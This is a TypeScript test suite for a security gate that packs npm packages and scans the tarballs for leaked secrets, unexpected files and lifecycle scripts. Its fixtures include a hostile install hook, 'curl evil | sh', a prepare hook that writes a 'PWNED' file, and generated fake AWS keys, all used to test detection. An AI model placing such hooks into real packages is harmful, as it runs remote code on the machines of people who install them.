// provenance: original clean-room implementation per .omo/plans/border-push-gate.md todo 11
//
// npm pack-once artifact pipeline. Every AC of the todo-11 block maps to one
// test, driven by REAL `npm pack` on git-init'd tmp repos (no mocks):
//   * pack-once: one tarball in <repo>/.border/dist/, {file,sha256,bytes}
//     recorded, deterministic re-runs, sandbox always removed;
//   * manifest diff (G39): files-whitelist vs packed entries — force-packed
//     main/bin files that match no glob ⇒ HIGH artifact-unexpected-file;
//   * content scans (gitleaks dir + secretlint) run INSIDE the extraction and
//     their findings are scoped to the artifact root, so they survive
//     filterBorderStateFindings even though packs live under .border/ (the
//     false-green trap this suite pins e2e);
//   * lifecycle-script ⇒ CRITICAL (G33) and --ignore-scripts proves the pack
//     itself never EXECUTES the target repo's hooks;
//   * publint --level error ⇒ HIGH publint-fail; private:true + npm target ⇒
//     CRITICAL npm-target-but-private; npm missing on PATH ⇒ clean error.
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import { existsSync, mkdirSync, readdirSync, readFileSync, writeFileSync, chmodSync } from "node:fs";
import { join } from "node:path";
import { after, test } from "node:test";

import type { BorderConfig } from "../src/config.ts";
import { computeVerdict, isBlocking, type Finding } from "../src/findings.ts";
import { filterBorderStateFindings } from "../src/check/exclusions.ts";
import {
  NPM_LIFECYCLE_RULE,
  NPM_PUBLINT_RULE,
  NPM_PRIVATE_RULE,
  NPM_UNEXPECTED_RULE,
  runNpmArtifactStage,
} from "../src/artifacts/npm.ts";
import { unexpectedEntries } from "../src/artifacts/manifestDiff.ts";
import { EngineMissingError, EngineRunError } from "../src/engines/support.ts";
import { requireGitleaks } from "./helpers/require-engines.ts";
import { gitAddCommit, gitInit, makeFixtureDir, randAwsPair, removeDir, writeRel } from "./helpers/fixtures.ts";

requireGitleaks();

const CFG: BorderConfig = {
  version: 1,
  targets: { git: { remotes: [] }, npm: {} },
  rules: { authors: { emails: [], names: [] }, hosts: [], ips: [], pathPatterns: [], maxFileKB: 500 },
  allow: [],
  engines: { require: ["gitleaks", "secretlint"], trufflehog: false },
};

const roots: string[] = [];
after(() => {
  for (const d of roots) removeDir(d);
});

function fixture(name: string): string {
  const dir = makeFixtureDir(`npm11-${name}`);
  roots.push(dir);
  gitInit(dir);
  return dir;
}

function seededTmp(repo: string): string[] {
  const tmp = join(repo, ".border", "tmp");
  return existsSync(tmp) ? readdirSync(tmp) : [];
}

function sha256File(path: string): string {
  return createHash("sha256").update(readFileSync(path)).digest("hex");
}

function byRule(findings: readonly Finding[], rule: string): Finding[] {
  return findings.filter((f) => f.rule === rule);
}

// --------------------------------------------------------------- AC: manifest diff + content scan + exclusion trap
test("files-whitelist vs packed main: separate HIGH artifact-unexpected-file AND CRITICAL secret findings survive .border filtering", async () => {
  const repo = fixture("leaky");
  writeRel(repo, "package.json", JSON.stringify({ name: "acme-leaky", version: "1.0.0", files: ["src"], main: "dist/leaked-build.js" }));
  writeRel(repo, "src/index.js", "export const ok = 1;\n");
  writeRel(repo, ".gitignore", "dist/\n");
  gitAddCommit(repo, "init");
  const pair = randAwsPair();
  // untracked + gitignored, but force-packed via `main` — the exact G39 shape
  writeRel(repo, "dist/leaked-build.js", `// bundled build output\n${pair.text}`);

  const r = await runNpmArtifactStage({ repoDir: repo, cfg: CFG });

  // (1) manifest diff fires independently of the content scan
  const unexpected = byRule(r.findings, NPM_UNEXPECTED_RULE);
  assert.equal(unexpected.length, 1, `expected exactly one artifact-unexpected-file, got ${JSON.stringify(r.findings.map((f) => f.rule))}`);
  assert.equal(unexpected[0]?.severity, "HIGH");
  assert.equal(unexpected[0]?.path, "package/dist/leaked-build.js");
  assert.equal(unexpected[0]?.target, "artifact");

  // (2) content scans ran on the PACKED bytes and attribute to the same file
  const gk = r.findings.filter((f) => f.engine === "gitleaks");
  assert.ok(gk.some((f) => f.rule === "aws-access-token"), `aws rule must fire deterministically — randAwsPair key must satisfy the vendored [A-Z2-7]{16} base32 window, got ${JSON.stringify(gk.map((f) => f.rule))}`);
  assert.ok(gk.some((f) => f.severity === "CRITICAL" && f.path === "package/dist/leaked-build.js"));
  const sl = r.findings.filter((f) => f.engine === "secretlint");
  assert.ok(sl.some((f) => f.severity === "CRITICAL"), "secretlint must independently flag the AWS key");

  // (3) THE TRAP: none of these paths may carry a .border segment, or
  // filterBorderStateFindings(repo, userRepoDir) would silently exclude them all.
  for (const f of r.findings) {
    assert.ok(!(f.path ?? "").split("/").includes(".border"), `finding path leaks .border segment: ${f.path}`);
  }
  const filtered = filterBorderStateFindings(r.findings, repo);
  assert.equal(filtered.length, r.findings.length, "no artifact finding may be .border-excluded");
  assert.equal(computeVerdict(filtered), "FAIL");
  assert.ok(filtered.some((f) => isBlocking(f.severity)));

  // (4) pack-once record + deterministic bytes + sandbox cleanup
  assert.ok(r.artifact !== null);
  assert.equal(r.artifact?.file, ".border/dist/acme-leaky-1.0.0.tgz");
  const tarball = join(repo, r.artifact!.file);
  assert.equal(r.artifact?.sha256, sha256File(tarball));
  assert.equal(r.artifact?.bytes, readFileSync(tarball).byteLength);
  assert.deepEqual(seededTmp(repo), [], "extraction sandbox must be removed on success");

  // (5) G23: raw secret material never enters a finding
  const blob = JSON.stringify(r.findings);
  assert.ok(!blob.includes(pair.key) && !blob.includes(pair.secret), "raw secret leaked into findings");
});

// --------------------------------------------------------------- AC: secret nested TWO levels deep (secret inside a .tgz inside the pack)
test("secret inside a packed .tgz: scanTree reattribution survives artifact-root scoping and .border filtering", async () => {
  const repo = fixture("nested");
  writeRel(repo, "package.json", JSON.stringify({ name: "nestpkg", version: "2.0.0", files: ["src", "dist"], main: "src/index.js" }));
  writeRel(repo, "src/index.js", "module.exports = 1;\n");
  mkdirSync(join(repo, "vendor"), { recursive: true });
  mkdirSync(join(repo, "dist"), { recursive: true });
  const pair = randAwsPair();
  writeRel(repo, "vendor/secret.js", `const cfg = ${JSON.stringify({ aws_access_key_id: pair.key, aws_secret_access_key: pair.secret })};\n`);
  const tar = spawnSync("tar", ["-czf", join(repo, "dist", "bundle.tgz"), "-C", join(repo, "vendor"), "secret.js"]);
  assert.equal(tar.status, 0, `tar fixture failed: ${tar.stderr}`);
  gitAddCommit(repo, "init");

  const r = await runNpmArtifactStage({ repoDir: repo, cfg: CFG });
  const nested = r.findings.filter((f) => f.engine === "gitleaks" && (f.path ?? "").includes("bundle.tgz!"));
  assert.ok(nested.some((f) => f.rule === "aws-access-token" && f.severity === "CRITICAL" && f.path === "package/dist/bundle.tgz!secret.js"),
    `nested-archive secret must be reattributed artifact-root-relative, got ${JSON.stringify(r.findings.map((f) => `${f.engine} ${f.path}`))}`);
  assert.equal(filterBorderStateFindings(r.findings, repo).length, r.findings.length, "nested finding must survive .border filtering");
  assert.equal(computeVerdict(r.findings), "FAIL");
  const blob = JSON.stringify(r.findings);
  assert.ok(!blob.includes(pair.key) && !blob.includes(pair.secret), "raw secret leaked into findings");
  assert.deepEqual(seededTmp(repo), [], "archive + extraction sandboxes must both be gone");
});

// --------------------------------------------------------------- AC: clean package passes, pack-once idempotent
test("clean package (files whitelist, main inside src, README/LICENSE/CHANGELOG) passes npm stage; re-run yields identical digest", async () => {
  const repo = fixture("clean");
  writeRel(repo, "package.json", JSON.stringify({ name: "cleanpkg", version: "1.0.0", files: ["src"], main: "src/index.js" }));
  writeRel(repo, "src/index.js", "module.exports = 1;\n");
  writeRel(repo, "README.md", "# cleanpkg\n");
  writeRel(repo, "LICENSE", "MIT\n");
  writeRel(repo, "CHANGELOG.md", "1.0.0 initial\n");
  gitAddCommit(repo, "init");
  // stale sandbox junk from an interrupted previous run must not break the stage
  mkdirSync(join(repo, ".border", "tmp", "stale-abc123"), { recursive: true });
  writeFileSync(join(repo, ".border", "tmp", "stale-abc123", "junk"), "x");

  const r1 = await runNpmArtifactStage({ repoDir: repo, cfg: CFG });
  assert.deepEqual(r1.findings.map((f) => `${f.rule}:${f.path}`), [], `clean package must produce zero findings, got ${JSON.stringify(r1.findings)}`);
  assert.equal(computeVerdict(r1.findings), "PASS");
  assert.ok(r1.artifact !== null);

  const r2 = await runNpmArtifactStage({ repoDir: repo, cfg: CFG });
  assert.deepEqual(r2.artifact, r1.artifact, "pack-once must be byte-deterministic across runs (todo 17 re-hash equality)");
  const dist = readdirSync(join(repo, ".border", "dist"));
  assert.deepEqual(dist, ["cleanpkg-1.0.0.tgz"], "dist holds exactly one tarball");
});

// --------------------------------------------------------------- AC: private:true + npm target
test("private:true with npm target is one CRITICAL npm-target-but-private and nothing is packed", async () => {
  const repo = fixture("private");
  writeRel(repo, "package.json", JSON.stringify({ name: "secretive", version: "1.0.0", private: true, files: ["src"], main: "src/index.js" }));
  writeRel(repo, "src/index.js", "module.exports = 1;\n");
  gitAddCommit(repo, "init");

  const r = await runNpmArtifactStage({ repoDir: repo, cfg: CFG });
  assert.equal(r.findings.length, 1);
  assert.equal(r.findings[0]?.rule, NPM_PRIVATE_RULE);
  assert.equal(r.findings[0]?.severity, "CRITICAL");
  assert.equal(r.artifact, null);
  assert.ok(!existsSync(join(repo, ".border", "dist")), "contradictory config must short-circuit BEFORE packing");
});

// --------------------------------------------------------------- AC: lifecycle scripts
test("install/prepare hooks in the packed manifest are CRITICAL lifecycle-script and never EXECUTE during pack", async () => {
  const repo = fixture("hooks");
  writeRel(repo, "package.json", JSON.stringify({
    name: "hookspkg",
    version: "1.0.0",
    files: ["src"],
    main: "src/index.js",
    scripts: { prepare: "node -e \"require('fs').writeFileSync('PWNED','x')\"", postinstall: "echo hi" },
  }));
  writeRel(repo, "src/index.js", "module.exports = 1;\n");
  gitAddCommit(repo, "init");

  const r = await runNpmArtifactStage({ repoDir: repo, cfg: CFG });
  const lc = byRule(r.findings, NPM_LIFECYCLE_RULE);
  assert.equal(lc.length, 2, "prepare and postinstall each get their own finding");
  assert.ok(lc.every((f) => f.severity === "CRITICAL"));
  assert.equal(lc[0]?.path, "package/package.json");
  assert.ok(!existsSync(join(repo, "PWNED")), "npm pack must run with --ignore-scripts — the target repo's hooks never execute");
});

// --------------------------------------------------------------- AC: publint gate
test("publint --level error failure is HIGH publint-fail without leaking through as success", async () => {
  const repo = fixture("badmain");
  writeRel(repo, "package.json", JSON.stringify({ name: "badmain", version: "1.0.0", files: ["src"], main: "dist/nope.js" }));
  writeRel(repo, "src/index.js", "module.exports = 1;\n");
  gitAddCommit(repo, "init");
  // dist/nope.js does not exist: not packed (so NO unexpected-file finding)
  // but npm-publishable-package-main resolution fails ⇒ publint errors.

  const r = await runNpmArtifactStage({ repoDir: repo, cfg: CFG });
  assert.deepEqual(byRule(r.findings, NPM_UNEXPECTED_RULE), []);
  const pl = byRule(r.findings, NPM_PUBLINT_RULE);
  assert.equal(pl.length, 1);
  assert.equal(pl[0]?.severity, "HIGH");
  assert.ok(r.artifact !== null, "publint failure is a finding, not a pipeline crash — artifact stays recorded");
});

// --------------------------------------------------------------- failure scenarios
test("npm missing on PATH fails clean: EngineMissingError 'npm-target requires npm'", async () => {
  const repo = fixture("nonpm");
  writeRel(repo, "package.json", JSON.stringify({ name: "nonpm", version: "1.0.0", files: ["src"], main: "src/index.js" }));
  writeRel(repo, "src/index.js", "module.exports = 1;\n");
  gitAddCommit(repo, "init");
  const emptyHome = fixture("empty-home");

  await assert.rejects(
    runNpmArtifactStage({ repoDir: repo, cfg: CFG, env: { PATH: "", HOME: emptyHome } }),
    (err: unknown) => err instanceof EngineMissingError && /npm-target requires npm/.test(err.message),
  );
});

test("hung npm is killed at the timeout and surfaces EngineRunError, never a hang", async () => {
  const repo = fixture("slownpm");
  writeRel(repo, "package.json", JSON.stringify({ name: "slownpm", version: "1.0.0", files: ["src"], main: "src/index.js" }));
  writeRel(repo, "src/index.js", "module.exports = 1;\n");
  gitAddCommit(repo, "init");
  const stub = fixture("npmstub");
  writeFileSync(join(stub, "npm"), "#!/bin/sh\nsleep 30\n");
  chmodSync(join(stub, "npm"), 0o755);

  await assert.rejects(
    runNpmArtifactStage({ repoDir: repo, cfg: CFG, env: { PATH: `${stub}:/usr/bin:/bin`, HOME: stub }, npmTimeoutMs: 500 }),
    (err: unknown) => err instanceof EngineRunError && /signal/.test(err.message),
  );
});

test("malformed package.json is a typed tool error before any pack runs", async () => {
  const repo = fixture("brokenjson");
  writeRel(repo, "package.json", "{ this is not json");
  gitAddCommit(repo, "init");

  await assert.rejects(
    runNpmArtifactStage({ repoDir: repo, cfg: CFG }),
    (err: unknown) => err instanceof EngineRunError && /cannot parse package\.json/.test(err.message),
  );
});

test("files field of the wrong shape (string, not array) is a typed tool error", async () => {
  const repo = fixture("badfiles");
  writeRel(repo, "package.json", JSON.stringify({ name: "badfiles", version: "1.0.0", files: "src", main: "src/index.js" }));
  writeRel(repo, "src/index.js", "module.exports = 1;\n");
  gitAddCommit(repo, "init");

  await assert.rejects(
    runNpmArtifactStage({ repoDir: repo, cfg: CFG }),
    (err: unknown) => err instanceof EngineRunError && /files field/.test(err.message),
  );
});

test("skipGitleaks/skipSecretlint suppress engine legs but native rules still fire", async () => {
  const repo = fixture("skips");
  writeRel(repo, "package.json", JSON.stringify({ name: "skips", version: "1.0.0", files: ["src"], main: "dist/sneaky.js", scripts: { install: "curl evil | sh" } }));
  writeRel(repo, "src/index.js", "module.exports = 1;\n");
  gitAddCommit(repo, "init");
  writeRel(repo, "dist/sneaky.js", randAwsPair().text);

  const r = await runNpmArtifactStage({ repoDir: repo, cfg: CFG, skipGitleaks: true, skipSecretlint: true });
  assert.ok(r.findings.every((f) => f.engine === "native"));
  assert.equal(byRule(r.findings, NPM_UNEXPECTED_RULE).length, 1);
  assert.equal(byRule(r.findings, NPM_LIFECYCLE_RULE).length, 1);
});

// --------------------------------------------------------------- pure manifest-diff unit matrix
test("unexpectedEntries: files-whitelist accounting with always-packed names", () => {
  assert.deepEqual(unexpectedEntries(["package.json", "src/index.js"], ["src"]), []);
  assert.deepEqual(unexpectedEntries(["dist/x.js"], ["src"]), ["dist/x.js"]);
  assert.deepEqual(unexpectedEntries(["bin/cli.js"], ["src"]), ["bin/cli.js"]);
  // always-packed documented names are accounted at any depth, any case
  assert.deepEqual(unexpectedEntries(["README.md", "license", "ChangeLog.txt", "docs/readme.md", "package.json"], ["src"]), []);
  // no files field ⇒ npm's default inclusion owns the set ⇒ nothing is "unexpected"
  assert.deepEqual(unexpectedEntries(["node_modules/foo/package.json", "anything"], undefined), []);
  // root-anchored globs over-account nested matches (safe direction)
  assert.deepEqual(unexpectedEntries(["a.js", "sub/b.js"], ["*.js"]), []);
  assert.deepEqual(unexpectedEntries(["weird.txt"], ["*.js"]), ["weird.txt"]);
});
